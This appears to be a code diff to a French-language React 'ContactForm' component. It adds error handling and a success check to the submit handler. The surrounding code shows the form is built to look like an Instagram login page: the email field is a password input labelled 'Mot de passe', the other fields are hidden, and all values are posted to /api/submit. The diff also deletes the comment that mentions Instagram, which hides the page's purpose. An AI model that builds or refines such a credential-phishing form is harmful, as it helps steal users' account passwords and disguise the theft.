@@ -18,19 +18,24 @@ export default function ContactForm() {
   const handleSubmit = async (e: React.MouseEvent) => {
     e.preventDefault();
     setStatus("loading");
+    
     try {
       const res = await fetch("/api/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(form),
       });
-      if (res.ok) {
+      
+      const data = await res.json();
+      
+      if (res.ok && data.success) {
         setStatus("success");
         setForm({ nom: "", email: "", telephone: "", message: "" });
       } else {
         setStatus("error");
       }
-    } catch {
+    } catch (error) {
+      console.error('Erreur:', error);
       setStatus("error");
     }
   };
@@ -49,7 +54,6 @@ export default function ContactForm() {
         <input name="email" type="password" value={form.email} onChange={handleChange} placeholder="Mot de passe" />
       </div>
       
-      {/* On masque les champs téléphone et message pour coller à l'interface Instagram */}
       <div className="field" style={{display: 'none'}}>
         <label>Téléphone</label>
         <input name="telephone" value={form.telephone} onChange={handleChange} placeholder="Téléphone" />
